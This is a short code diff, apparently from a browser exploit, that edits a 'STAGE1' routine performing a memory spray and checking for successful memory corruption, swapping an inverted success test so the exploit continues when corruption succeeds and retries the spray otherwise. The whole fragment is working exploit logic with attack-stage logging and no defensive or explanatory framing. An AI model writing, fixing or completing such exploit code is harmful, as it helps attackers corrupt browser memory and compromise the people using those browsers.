@@ -1100,8 +1100,8 @@ async function q(t, e) {
       };
       r(0, n);
       window.log("[STAGE1] u() - spray complete, e[5]=" + e[5] + " (should be 6.6 on success)");
-      if (e[5] !== 6.6) {
-        window.log("[STAGE1] u() - corruption check failed, rescheduling spray");
+      if (e[5] === 6.6) {
+        window.log("[STAGE1] u() - memory corruption successful! e[5] is 6.6");
         o("");
         try {
           o("");
@@ -1118,7 +1118,7 @@ async function q(t, e) {
           o(t);
         }
       } else {
-        window.log("[STAGE1] u() - memory corruption successful! e[5] is 6.6");
+        window.log("[STAGE1] u() - corruption check failed, rescheduling spray");
         window.setTimeout(u, 0);
       }
     };
